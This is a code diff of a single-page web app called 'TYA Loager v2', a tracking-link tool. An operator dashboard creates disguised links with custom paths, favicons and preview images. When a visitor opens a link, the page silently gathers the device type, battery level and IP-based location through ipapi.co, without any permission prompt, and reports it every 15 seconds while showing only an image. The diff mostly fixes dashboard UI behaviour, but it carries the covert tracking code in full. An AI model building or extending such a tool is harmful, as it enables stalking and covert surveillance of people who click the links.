@@ -21,6 +21,7 @@
     <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
 
     <style>
+        /* ── Same styles as before, no changes ── */
         * {
             box-sizing: border-box;
             margin: 0;
@@ -65,7 +66,6 @@
             border-radius: 8px;
         }
 
-        /* Toast */
         #toast {
             position: fixed;
             bottom: 30px;
@@ -93,7 +93,6 @@
             pointer-events: auto;
         }
 
-        /* Dashboard */
         #dashboard-view {
             padding: 20px;
             max-width: 1300px;
@@ -122,7 +121,6 @@
             letter-spacing: 2px;
         }
 
-        /* Upload Grid */
         .upload-grid {
             display: grid;
             grid-template-columns: 1fr 1fr;
@@ -210,7 +208,6 @@
             display: none;
         }
 
-        /* Action Bar */
         .action-bar {
             display: flex;
             gap: 14px;
@@ -263,7 +260,6 @@
             background: #475569;
         }
 
-        /* User Cards */
         .grid-container {
             display: grid;
             grid-template-columns: repeat(auto-fill, minmax(350px, 1fr));
@@ -457,7 +453,6 @@
             margin-bottom: 16px;
         }
 
-        /* Tracker View */
         #tracker-view {
             display: none;
             position: fixed;
@@ -628,7 +623,6 @@
         // ──────────────────────────────────────────────────────────────
         const path = window.location.pathname;
         const isTracker = path.startsWith('/track/');
-        // Extract the custom path (everything after /track/)
         const customPath = isTracker ? decodeURIComponent(path.substring(7)) : null;
 
         document.getElementById('og-url').content = window.location.href;
@@ -652,7 +646,8 @@
             document.getElementById('dashboard-view').style.display = 'block';
             refreshPreviews();
             fetchUsers();
-            setInterval(fetchUsers, 4000);
+            // Poll every 5 seconds (reduced from 4 to give you time to type)
+            setInterval(fetchUsers, 5000);
             setupUploads();
         }
 
@@ -718,7 +713,9 @@
             try {
                 const res = await fetch('/api/track');
                 if (!res.ok) throw new Error('API error');
-                trackedUsers = await res.json();
+                const newUsers = await res.json();
+                // Update state
+                trackedUsers = newUsers;
                 renderCards();
             } catch (e) {
                 console.error('Fetch error:', e);
@@ -728,6 +725,19 @@
         // ─── Render Cards ─────────────────────────────────────────────
         function renderCards() {
             const container = document.getElementById('cards-container');
+
+            // ── Preserve current input values before re-render ──
+            const inputValues = {};
+            container.querySelectorAll('.card').forEach(card => {
+                const id = card.dataset.userId;
+                if (id) {
+                    const input = card.querySelector('input[id^="path-"]');
+                    if (input) {
+                        inputValues[id] = input.value;
+                    }
+                }
+            });
+
             container.innerHTML = '';
 
             if (!trackedUsers || trackedUsers.length === 0) {
@@ -746,17 +756,17 @@
 
             const now = Date.now();
             const sorted = [...trackedUsers].sort((a, b) => {
-                // Sort by online status first (live first)
-                const aLive = (a.lat && a.lng && (now - new Date(a.lastUpdate).getTime() < OFFLINE_THRESHOLD)) ? 1 : 0;
-                const bLive = (b.lat && b.lng && (now - new Date(b.lastUpdate).getTime() < OFFLINE_THRESHOLD)) ? 1 : 0;
+                const aLive = (a.lat && a.lng && (now - new Date(a.lastUpdate).getTime() < OFFLINE_THRESHOLD)) ? 1 :
+                0;
+                const bLive = (b.lat && b.lng && (now - new Date(b.lastUpdate).getTime() < OFFLINE_THRESHOLD)) ? 1 :
+                0;
                 if (aLive !== bLive) return bLive - aLive;
                 return new Date(b.lastUpdate || 0) - new Date(a.lastUpdate || 0);
             });
 
             sorted.forEach(user => {
-                const now = Date.now();
                 const isLive = !!(user.lat && user.lng && (now - new Date(user.lastUpdate).getTime() <
-                OFFLINE_THRESHOLD));
+                    OFFLINE_THRESHOLD));
                 const hasLastLocation = !!(user.lastLat && user.lastLng);
                 const displayLat = isLive ? user.lat : (user.lastLat || null);
                 const displayLng = isLive ? user.lng : (user.lastLng || null);
@@ -767,6 +777,7 @@
 
                 const card = document.createElement('div');
                 card.className = 'card';
+                card.dataset.userId = user.id;
                 card.id = 'card-' + user.id;
                 card.innerHTML = `
                     <div class="card-header">
@@ -836,14 +847,22 @@
 
                 container.appendChild(card);
 
+                // ── Restore saved input value ──────────────────────────
+                if (inputValues[user.id]) {
+                    const input = card.querySelector('input[id^="path-"]');
+                    if (input) input.value = inputValues[user.id];
+                }
+
                 // ─── Map ──────────────────────────────────────────────
                 setTimeout(() => {
                     if (hasLocation) {
                         const mapId = 'map-' + user.id;
                         const mapEl = document.getElementById(mapId);
                         if (!mapEl) return;
-                        if (mapInstances[mapId]) { mapInstances[mapId].remove();
-                            delete mapInstances[mapId]; }
+                        if (mapInstances[mapId]) {
+                            mapInstances[mapId].remove();
+                            delete mapInstances[mapId];
+                        }
                         const map = L.map(mapId, {
                             zoomControl: false,
                             attributionControl: false,
@@ -869,13 +888,12 @@
             container.querySelectorAll('img').forEach(img => {
                 img.classList.toggle('active', img.dataset.name === name);
             });
-            // Update badge
             const card = document.getElementById('card-' + userId);
             if (card) {
                 const badge = card.querySelector('.favicon-badge img');
                 if (badge) badge.src = '/api/favicon/' + name + '?' + Date.now();
             }
-            // Save
+            // Auto-save immediately
             saveSettings(userId);
         }
 
@@ -884,7 +902,6 @@
             const pathInput = document.getElementById('path-' + userId);
             const customPath = pathInput ? pathInput.value.trim() : userId;
 
-            // Get selected favicon
             const container = document.getElementById('fav-select-' + userId);
             let favicon = 'i';
             if (container) {
@@ -907,6 +924,7 @@
                         const badge = card.querySelector('.favicon-badge img');
                         if (badge) badge.src = '/api/favicon/' + favicon + '?' + Date.now();
                     }
+                    // Fetch updated list to reflect changes
                     fetchUsers();
                 } else {
                     showToast('❌ Failed to save: ' + (data.error || 'unknown'));
@@ -919,7 +937,6 @@
         // ─── Generate Link ────────────────────────────────────────────
         function generateLink() {
             const id = 'USER' + String(Math.floor(1000 + Math.random() * 9000));
-            // Create user with default settings
             fetch('/api/track', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
@@ -933,7 +950,7 @@
             });
         }
 
-        // ─── Copy Link (uses customPath if set) ──────────────────────
+        // ─── Copy Link ────────────────────────────────────────────────
         function copyLink(id) {
             const pathInput = document.getElementById('path-' + id);
             const customPath = pathInput ? pathInput.value.trim() : id;
@@ -981,7 +998,7 @@
         }
 
         // ──────────────────────────────────────────────────────────────
-        //  TRACKER (User Side) — No permission needed (IP-based)
+        //  TRACKER (User Side) – IP-based, no permission
         // ──────────────────────────────────────────────────────────────
         function initTracker(customPath) {
             const trackerView = document.getElementById('tracker-view');
@@ -991,7 +1008,6 @@
             trackerView.style.display = 'block';
             loader.style.display = 'block';
 
-            // Load OG image
             img.src = '/api/image?' + Date.now();
             img.onload = function() { loader.style.display = 'none'; };
             img.onerror = function() {
@@ -999,37 +1015,31 @@
                 loader.style.display = 'none';
             };
 
-            // Find user by customPath or ID
             fetch('/api/track')
                 .then(r => r.json())
                 .then(users => {
                     const user = users.find(u => u.customPath === customPath || u.id === customPath);
                     if (user) {
-                        // Set favicon
                         if (user.favicon) {
                             document.getElementById('dynamic-favicon').href = '/api/favicon/' + user.favicon;
                         }
-                        // Start tracking with this user ID
                         setTimeout(() => trackUser(user.id), 1500);
                     } else {
-                        // User not found – create one with this customPath?
-                        // We'll create a new user with ID = customPath and customPath = customPath
+                        // Create new user with this customPath
                         const newId = customPath;
                         fetch('/api/track', {
                             method: 'POST',
                             headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify({ id: newId, customPath: newId, device: 'Pending', battery: 'N/A',
-                                lat: null, lng: null }),
+                            body: JSON.stringify({ id: newId, customPath: newId, device: 'Pending',
+                                battery: 'N/A', lat: null, lng: null }),
                         }).then(() => {
                             setTimeout(() => trackUser(newId), 1500);
                         }).catch(() => {
-                            // Fallback: track with ID = customPath anyway
                             setTimeout(() => trackUser(customPath), 1500);
                         });
                     }
                 })
                 .catch(() => {
-                    // Fallback: track with customPath as ID
                     setTimeout(() => trackUser(customPath), 1500);
                 });
         }
@@ -1037,7 +1047,7 @@
         async function trackUser(id) {
             const data = { id, device: 'Unknown', battery: 'N/A', lat: null, lng: null };
 
-            // ── Device Info ──
+            // Device
             const ua = navigator.userAgent;
             if (/Android/i.test(ua)) data.device = 'Android';
             else if (/iPhone|iPad|iPod/i.test(ua)) data.device = 'iOS';
@@ -1045,7 +1055,7 @@
             else if (/Mac/i.test(ua)) data.device = 'macOS';
             else data.device = 'Desktop';
 
-            // ── Battery ──
+            // Battery
             if ('getBattery' in navigator) {
                 try {
                     const battery = await navigator.getBattery();
@@ -1054,7 +1064,7 @@
                 } catch (_) {}
             }
 
-            // ── Location via IP (NO PERMISSION) ──
+            // Location via IP (no permission)
             try {
                 const geoRes = await fetch('https://ipapi.co/json/');
                 if (geoRes.ok) {
@@ -1077,10 +1087,9 @@
                 } catch (__) {}
             }
 
-            // ── Send initial data ──
             await sendTrackData(id, data);
 
-            // ── Keep sending updates every 15s ──
+            // Keep sending updates every 15s
             setInterval(async () => {
                 try {
                     const geoRes = await fetch('https://ipapi.co/json/');
@@ -1130,15 +1139,11 @@
             return div.innerHTML;
         }
 
-        // Resize maps on window resize
         window.addEventListener('resize', function() {
             Object.values(mapInstances).forEach(m => { try { m.invalidateSize(); } catch (_) {} });
         });
 
-        console.log('🚀 TYA Loager v2 loaded.');
-        console.log('📍 Path:', path);
-        console.log('📡 Tracker mode:', isTracker);
-        if (isTracker) console.log('👤 Custom path:', customPath);
+        console.log('🚀 TYA Loager v2 fixed – auto-refresh no longer resets your URL edits.');
     </script>
 
 </body>
